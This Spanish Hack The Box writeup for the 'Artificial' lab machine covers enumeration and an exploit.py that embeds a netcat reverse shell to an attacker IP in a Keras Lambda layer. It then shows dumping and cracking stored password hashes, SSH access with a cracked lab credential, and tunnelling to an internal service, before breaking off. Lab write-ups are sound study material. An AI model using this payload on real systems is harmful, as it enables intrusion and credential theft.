<!DOCTYPE html><!-- Layout espec√≠fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/contact.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/contact.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si est√° disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Ciberseguridad ¬∑ Hacking √âtico</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
‚Üê Volver a Writeups
</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Artificial Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">10 de septiembre de 2025</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Debe tener Descripccion </p> </div> <!-- BLOQUE DE INFORMACI√ìN T√âCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles T√©cnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Easy</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnolog√≠a</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> nmap </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> gobuster </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> ssh </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> sudo -l </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <h1 id="-planificaci√≥n-y-alcance">üìù Planificaci√≥n y Alcance</h1>
<hr>
<ul>
<li>
<p>IP: <code>10.10.11.74</code></p>
</li>
<li>
<p>Dominio: <code>artificial.htb</code></p>
</li>
<li>
<p>Cliente: <code>HTB</code></p>
</li>
</ul>
<hr>
<h1 id="-escaneo-y-enumeraci√≥n">üîé Escaneo y Enumeraci√≥n</h1>
<h3 id="-escaneos">üìå Escaneos</h3>
<ul>
<li>Escanear y Exportar resultados:</li>
</ul>
<p><code>nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml &#x3C;IP></code></p>
<hr>
<h3 id="Ô∏è-puertos-y-servicios-descubiertos">üõ†Ô∏è Puertos y Servicios Descubiertos</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">PORT</span><span style="color:#F1FA8C">   STATE</span><span style="color:#F1FA8C"> SERVICE</span><span style="color:#F1FA8C"> REASON</span><span style="color:#F1FA8C">         VERSION</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">22/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  ssh</span><span style="color:#F1FA8C">     syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> OpenSSH</span><span style="color:#F1FA8C"> 8.2p1</span><span style="color:#F1FA8C"> Ubuntu</span><span style="color:#F1FA8C"> 4ubuntu0.13</span><span style="color:#F8F8F2"> (Ubuntu </span><span style="color:#F1FA8C">Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">protocol</span><span style="color:#BD93F9"> 2.0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">80/tcp</span><span style="color:#F1FA8C"> open</span><span style="color:#F1FA8C">  http</span><span style="color:#F1FA8C">    syn-ack</span><span style="color:#F1FA8C"> ttl</span><span style="color:#BD93F9"> 63</span><span style="color:#F1FA8C"> nginx</span><span style="color:#BD93F9"> 1.18.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B"> http-methods:</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_</span><span style="color:#F1FA8C">  Supported</span><span style="color:#F1FA8C"> Methods:</span><span style="color:#F1FA8C"> GET</span><span style="color:#F1FA8C"> HEAD</span><span style="color:#F1FA8C"> POST</span><span style="color:#F1FA8C"> OPTIONS</span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_http-title:</span><span style="color:#F1FA8C"> Did</span><span style="color:#F1FA8C"> not</span><span style="color:#F1FA8C"> follow</span><span style="color:#F1FA8C"> redirect</span><span style="color:#F1FA8C"> to</span><span style="color:#F1FA8C"> http://artificial.htb/</span></span>
<span class="line"><span style="color:#FF79C6">|</span><span style="color:#50FA7B">_http-server-header:</span><span style="color:#F1FA8C"> nginx/1.18.0</span><span style="color:#F8F8F2"> (Ubuntu)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">Service</span><span style="color:#F1FA8C"> Info:</span><span style="color:#F1FA8C"> OS:</span><span style="color:#F1FA8C"> Linux</span><span style="color:#F8F8F2">; </span><span style="color:#50FA7B">CPE:</span><span style="color:#F1FA8C"> cpe:/o:linux:linux_kernel</span></span>
<span class="line"></span></code></pre>
<ul>
<li>WhatWeb: <code>HTTP Server Ubuntu Linux nginx/1.18.0 (Ubuntu), Script, Title Artificial - AI Solutions, nginx 1.18.0</code></li>
</ul>
<hr>
<h3 id="-enumeraci√≥n-web">üåê Enumeraci√≥n Web</h3>
<ul>
<li><strong>Enumeraci√≥n de directorios:</strong></li>
</ul>
<p><code>gobuster dir -u http://&#x3C;IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -b &#x3C;NO-STATUS></code></p>
<hr>
<h3 id="-hallazgos">üìÇ Hallazgos</h3>
<ul>
<li>Web:<br>
<strong>Home</strong>
![[Pasted image 20250923194844.png]]</li>
</ul>
<p><strong>Login</strong>
![[Pasted image 20250923195009.png]]</p>
<p><strong>En la pagina login nos debemos registrar y con esas credenciales ingresar al dashboard.</strong></p>
<p><strong>Dashboard</strong>
![[Pasted image 20250921184827.png]]</p>
<hr>
<ul>
<li>
<p>Tecnolog√≠as: <code>Nginx 1.18.0</code></p>
</li>
<li>
<p>Recurso accesibles descargables: requerimients.txt y Dockerfile.</p>
</li>
<li>
<p>Contenido Archivos:</p>
</li>
</ul>
<p><strong>requerimients.txt:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#BD93F9">tensorflow-cpu</span><span style="color:#FF79C6">=</span><span style="color:#F1FA8C">=2.13.1</span></span>
<span class="line"></span></code></pre>
<p><strong>Dockerfile:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">FROM</span><span style="color:#F1FA8C"> python:3.8-slim</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">WORKDIR</span><span style="color:#F1FA8C"> /code</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">RUN</span><span style="color:#F1FA8C"> apt-get</span><span style="color:#F1FA8C"> update</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    apt-get</span><span style="color:#F1FA8C"> install</span><span style="color:#BD93F9"> -y</span><span style="color:#F1FA8C"> curl</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    curl</span><span style="color:#BD93F9"> -k</span><span style="color:#BD93F9"> -LO</span><span style="color:#F1FA8C"> https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</span><span style="color:#F8F8F2"> &#x26;&#x26; </span><span style="color:#FF79C6">\</span></span>
<span class="line"><span style="color:#50FA7B">    rm</span><span style="color:#BD93F9"> -rf</span><span style="color:#F1FA8C"> /var/lib/apt/lists/</span><span style="color:#BD93F9;font-style:italic">*</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">RUN</span><span style="color:#F1FA8C"> pip</span><span style="color:#F1FA8C"> install</span><span style="color:#F1FA8C"> ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">ENTRYPOINT</span><span style="color:#F8F8F2"> [</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/bin/bash</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">]</span></span>
<span class="line"></span></code></pre>
<hr>
<h1 id="-explotaci√≥n">üí• Explotaci√≥n</h1>
<ul>
<li>
<p>Servicio: <code>Web</code></p>
</li>
<li>
<p>M√©todo: <code>Inyeccion de comandos</code></p>
</li>
<li>
<p>Exploit: <code>___</code></p>
</li>
<li>
<p>Resultado (shell/flag): <code>shell</code></p>
</li>
</ul>
<h2 id="configuraci√≥n-de-un-entorno-docker-para-el-exploit-de-tensorflow">Configuraci√≥n de un entorno Docker para el exploit de TensorFlow</h2>
<ul>
<li>Ambos¬†<code>requirements.txt</code> y <code>Dockerfile</code> se descargaron en mi¬†<code>Downloads</code>carpeta. Antes de crear el entorno Docker para el exploit, cre√© un script de carga √∫til en el mismo directorio.</li>
</ul>
<p><strong>Paso 1: Crear el script de carga √∫til</strong></p>
<p>En mi¬†<code>Downloads</code>carpeta, cre√© un archivo llamado¬†<code>exploit.py</code>. Este script contiene mi carga √∫til de TensorFlow:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">import</span><span style="color:#F1FA8C"> tensorflow</span><span style="color:#F1FA8C"> as</span><span style="color:#F1FA8C"> tf</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">def</span><span style="color:#F1FA8C"> exploit</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">x</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">:</span></span>
<span class="line"><span style="color:#50FA7B">    import</span><span style="color:#F1FA8C"> os</span></span>
<span class="line"><span style="color:#50FA7B">    os.system(</span><span style="color:#50FA7B">"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc &#x3C;MY-IP> 4444 >/tmp/f"</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">    return</span><span style="color:#F1FA8C"> x</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">model</span><span style="color:#F1FA8C"> =</span><span style="color:#F1FA8C"> tf.keras.Sequential</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#50FA7B">model.add(tf.keras.layers.Input(shape</span><span style="color:#F1FA8C">=</span><span style="color:#F8F8F2">(</span><span style="color:#F1FA8C">64,</span><span style="color:#F8F8F2">)))</span></span>
<span class="line"><span style="color:#50FA7B">model.add(tf.keras.layers.Lambda(exploit</span><span style="color:#F8F8F2">))</span></span>
<span class="line"><span style="color:#50FA7B">model.compile</span><span style="color:#F8F8F2">()</span></span>
<span class="line"><span style="color:#50FA7B">model.save(</span><span style="color:#50FA7B">"exploit.h5"</span><span style="color:#F8F8F2">)</span></span>
<span class="line"></span></code></pre>
<p><strong>Paso 2: Construir la imagen de Docker</strong></p>
<ul>
<li>Luego abr√≠ una terminal en la¬†<code>Downloads</code>carpeta y ejecut√©:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> docker</span><span style="color:#F1FA8C"> build</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> artificial-exploit</span><span style="color:#F1FA8C"> .</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Esto cre√≥ una imagen de Docker con Python 3.8 y TensorFlow 2.13.1 instalados, que coincid√≠a con el entorno de destino.</li>
</ul>
<p><strong>Paso 3: Ejecute el contenedor Docker con un volumen compartido</strong></p>
<ul>
<li>Para asegurar que el archivo de carga √∫til apareciera en mi sistema host, ejecut√©:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> docker</span><span style="color:#F1FA8C"> run</span><span style="color:#BD93F9"> -it</span><span style="color:#BD93F9"> -v</span><span style="color:#F8F8F2"> $(</span><span style="color:#8BE9FD">pwd</span><span style="color:#F8F8F2">)</span><span style="color:#F1FA8C">:/app</span><span style="color:#F1FA8C"> artificial-exploit</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p><code>$(pwd)</code>asigna la carpeta del host actual al¬†<code>/app</code>interior del contenedor.</p>
</li>
<li>
<p>Cualquier archivo guardado¬†<code>/app</code>dentro del contenedor aparece autom√°ticamente en el host.</p>
</li>
</ul>
<p><strong>Paso 4: Generar la carga √∫til dentro de Docker</strong></p>
<ul>
<li>Dentro del contenedor, navegu√©¬†<code>/app</code>y ejecut√© el script:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> /app</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> exploit.py</span></span>
<span class="line"></span></code></pre>
<ul>
<li>El archivo¬†<code>exploit.h5</code>se gener√≥¬†y tambi√©n apareci√≥ <code>/app</code> en mi carpeta de host.</li>
</ul>
<p><strong>Paso 5: Iniciar un receptor para el shell inverso</strong></p>
<ul>
<li>En mi m√°quina local, inici√© un escucha netcat para capturar el shell inverso:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">nc</span><span style="color:#BD93F9">  -nlvp</span><span style="color:#BD93F9">  4444</span></span>
<span class="line"></span></code></pre>
<p><strong>Paso 6: Subir la carga √∫til a la Web</strong></p>
<ul>
<li>Vaya al panel de control (Dashboard), seleccione el¬†archivo <code>exploit.h5</code> y cargue el modelo. Despu√©s de cargarlo, ejecute la carga √∫til haciendo clic en ‚Äù¬†<strong>Ver predicciones‚Äù</strong>¬†.</li>
</ul>
<p>![[Pasted image 20250925170700.png]]</p>
<ul>
<li>Una vez que el modelo se ejecut√≥ en el servidor web, mi oyente capt√≥ exitosamente la conexi√≥n, d√°ndome un shell, en este momento podemos mejorar la TTY si lo deseamos.</li>
</ul>
<h2 id="ganando-usuarios">Ganando usuarios</h2>
<ul>
<li>
<p>Al iniciar mi shell como¬†usuario <code>app</code>, mi primer instinto fue¬†<strong>enumerar el directorio de la aplicaci√≥n</strong>¬†.</p>
</li>
<li>
<p>Ejecut√©:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ls</span><span style="color:#BD93F9"> -la</span></span></code></pre>
<p>![[Pasted image 20250923200353.png]]</p>
<ul>
<li>
<p>Una carpeta llamada¬†<code>instance</code>y un archivo llamado¬†<code>users.db</code>.</p>
</li>
<li>
<p>Esa¬†<code>.db</code>extensi√≥n¬†me record√≥¬†<strong>a SQLite .</strong></p>
</li>
<li>
<p>Dado que Flask (y muchas aplicaciones web de Python) a menudo almacenan sus datos en una base de datos SQLite dentro de una¬†<code>instance/</code>carpeta, esto me hizo sospechar que pod√≠a volcar las credenciales de usuario directamente desde all√≠.</p>
</li>
<li>
<p>Confirm√© mi presentimiento al ejecutar:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">file</span><span style="color:#F1FA8C"> instance/users.db</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p>Regres√≥¬†<code>SQLite 3.x database</code>. ¬°Bingo! Definitivamente SQLite.</p>
</li>
<li>
<p>Desde all√≠, quise comprobar qu√© tablas exist√≠an, as√≠ que lo abr√≠ directamente:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">sqlite3</span><span style="color:#F1FA8C"> instance/users.db</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Una vez en el shell de SQLite, enumer√© todas las tablas:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">.tables</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Vi dos tablas:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">model</span><span style="color:#F1FA8C">  user</span></span>
<span class="line"></span></code></pre>
<ul>
<li>La¬†tabla <code>user</code> me llam√≥ la atenci√≥n de inmediato. Inspeccion√© su esquema:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">PRAGMA</span><span style="color:#F1FA8C"> table_info</span><span style="color:#F8F8F2">(</span><span style="color:#50FA7B">user</span><span style="color:#F8F8F2">);</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p>Devuelve la informaci√≥n de las columnas de la tabla <code>user</code> en SQLite.</p>
</li>
<li>
<p>El comando <code>PRAGMA table_info(nombre_tabla);</code> lista:</p>
</li>
</ul>
<ol>
<li>
<p><strong>cid</strong> ‚Üí √≠ndice de la columna (empieza en 0).</p>
</li>
<li>
<p><strong>name</strong> ‚Üí nombre de la columna.</p>
</li>
<li>
<p><strong>type</strong> ‚Üí tipo de dato declarado (ej. <code>TEXT</code>, <code>INTEGER</code>).</p>
</li>
<li>
<p><strong>notnull</strong> ‚Üí 1 si la columna es <code>NOT NULL</code>, 0 si permite nulos.</p>
</li>
<li>
<p><strong>dflt_value</strong> ‚Üí valor por defecto de la columna.</p>
</li>
<li>
<p><strong>pk</strong> ‚Üí 1 si forma parte de la clave primaria, 0 en caso contrario.</p>
</li>
</ol>
<ul>
<li>
<p>Esto mostr√≥ campos para¬†<code>id</code>,¬†<code>username</code>,¬†<code>email</code>, y¬†<code>password</code>.</p>
</li>
<li>
<p>El paso final fue volcar el contenido:</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">SELECT</span><span style="color:#BD93F9;font-style:italic"> *</span><span style="color:#F1FA8C"> FROM</span><span style="color:#F1FA8C"> user</span><span style="color:#F8F8F2">;</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Y as√≠, tuve¬†<strong>todos los nombres de usuario, correos electr√≥nicos y contrase√±as cifradas</strong>¬†para cada cuenta en la aplicaci√≥n.</li>
</ul>
<p>![[Pasted image 20250925121324.png]]</p>
<h2 id="volcado-y-descifrado-de-hashes-de-contrase√±as">Volcado y descifrado de hashes de contrase√±as</h2>
<ul>
<li>Desde mi shell, volqu√© los hashes de contrase√±a almacenados directamente desde la base de datos (luego de salir del indicador de SQLite con¬†<code>.quit</code>si es necesario) a un archivo hash.txt:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">sqlite3</span><span style="color:#F1FA8C"> instance/users.db</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">SELECT password FROM user;</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<p>![[Pasted image 20250925121242.png]]</p>
<ul>
<li>Con los hashes guardados, us√©¬†<strong>Hashcat</strong>¬†en mi m√°quina atacante para descifrarlos con la¬†<code>rockyou.txt</code>lista de palabras:</li>
</ul>
<p>![[Pasted image 20250925121834.png]]</p>
<h2 id="credenciales-descifradas">Credenciales descifradas</h2>
<ul>
<li>
<p>Al ejecutar Hashcat contra la¬†<code>rockyou.txt</code>lista de palabras se revelaron r√°pidamente dos credenciales v√°lidas:</p>
</li>
<li>
<p>Credenciales Encontradas (utiles):</p>
</li>
</ul>
<p>==gael:mattp005numbertwo==</p>
<ul>
<li>Probablemente se trataba de cuentas de usuario reales en el sistema objetivo. Con esta informaci√≥n, mi siguiente paso fue intentar¬†<strong>iniciar sesi√≥n por SSH</strong>¬†para comprobar si alguna de las cuentas ten√≠a privilegios de acceso remoto.</li>
</ul>
<hr>
<hr>
<h1 id="Ô∏è-escalada">üõ°Ô∏è Escalada</h1>
<ul>
<li>
<p>Impacto real: <code>SI</code></p>
</li>
<li>
<p>Rutas clave: <code>___</code></p>
</li>
<li>
<p>M√©todo: <code>Pivoting, Reastic abuse privilege</code></p>
</li>
<li>
<p>Nivel de Acceso: <code>root</code></p>
</li>
<li>
<p>PoC: <code>___</code></p>
</li>
</ul>
<hr>
<h2 id="movimiento-lateral-a-trav√©s-de-ssh">Movimiento lateral a trav√©s de SSH</h2>
<ul>
<li>
<p>Con las credenciales descifradas en la mano, comenc√© a probar el acceso SSH desde mi m√°quina atacante:</p>
</li>
<li>
<p>Ingresamos con el usuario gael y su credencial.</p>
</li>
</ul>
<h2 id="bandera-user">Bandera user:</h2>
<ul>
<li>Busqu√© el¬†<code>user.txt</code>archivo en el sistema ejecutando:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">find</span><span style="color:#F1FA8C"> /</span><span style="color:#BD93F9"> -type</span><span style="color:#F1FA8C"> f</span><span style="color:#BD93F9"> -name</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">user.txt</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Devolvi√≥ la ruta:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">/home/gael/user.txt</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Despu√©s de eso, realic√© una enumeraci√≥n r√°pida para recopilar informaci√≥n del sistema y buscar posibles rutas de escalada de privilegios:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">id</span></span>
<span class="line"><span style="color:#50FA7B">whoami</span></span>
<span class="line"><span style="color:#50FA7B">hostnamectl</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#BD93F9"> -l</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">ss</span><span style="color:#BD93F9"> -tulnp</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> LISTEN</span><span style="color:#F8F8F2">   </span></span>
<span class="line"><span style="color:#50FA7B">ls</span><span style="color:#BD93F9"> -la</span><span style="color:#F1FA8C"> /var/backups</span></span>
<span class="line"></span></code></pre>
<p>![[Pasted image 20250925123031.png]]</p>
<p>Recomendaciones:</p>
<ul>
<li>
<p><code>gael</code><strong>no</strong>¬†era¬†un usuario sudo.</p>
</li>
<li>
<p>Exist√≠a un archivo de respaldo en¬†<code>/var/backups/backrest_backup.tar.gz</code>.</p>
</li>
<li>
<p>Un servicio interno estaba escuchando en¬†<code>127.0.0.1:9898</code>.</p>
</li>
<li>
<p>decidi copiar el archivo backrest_backup.tar.gz a mi maquina y descomprimirla.</p>
</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">scp</span><span style="color:#F1FA8C"> gael@10.10.11.74:/var/backups/backrest_backup.tar.gz</span><span style="color:#F1FA8C"> .</span></span>
<span class="line"></span></code></pre>
<ul>
<li>El archivo¬†<code>backrest_backup.tar.gz</code>result√≥ ser un archivo TAR simple, no comprimido con GZIP:</li>
</ul>
<p>![[Pasted image 20250925123904.png]]</p>
<ul>
<li>Al buscar los archivos extra√≠dos, encontr√© un archivo de configuraci√≥n. Lo revis√©¬†<code>config.json</code>y encontr√© una contrase√±a codificada con bcrypt. Tras extraer el hash, lo guard√© en un archivo:</li>
</ul>
<p>![[Pasted image 20250925124053.png]]</p>
<p>Luego us√©¬†<strong>Hashcat</strong>¬†con la¬†<code>rockyou.txt</code>lista de palabras para descifrarlo:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">hashcat</span><span style="color:#BD93F9"> -m</span><span style="color:#BD93F9"> 3200</span><span style="color:#F1FA8C"> /tmp/bcrypt.hash</span><span style="color:#F1FA8C"> /usr/share/wordlists/rockyou.txt</span><span style="color:#BD93F9"> --force</span></span>
<span class="line"></span></code></pre>
<ul>
<li>Resultado:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#FF79C6">!</span><span style="color:#50FA7B">@#$%^</span></span>
<span class="line"></span></code></pre>
<p>![[Pasted image 20250925124713.png]]</p>
<h2 id="pivotando-hacia-el-servicio-interno">Pivotando hacia el Servicio Interno</h2>
<ul>
<li>Estas credenciales pertenec√≠an a una¬†<strong>cuenta de administrador</strong>¬†de un servicio web local que se ejecutaba en el puerto¬†<code>9898</code>. Las redirig√≠ a mi m√°quina:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">ssh</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> 9898:127.0.0.1:9898</span><span style="color:#F1FA8C"> gael@10.10.11.74</span></span>
<span class="line"></span></code></pre>
<ul>
<li>
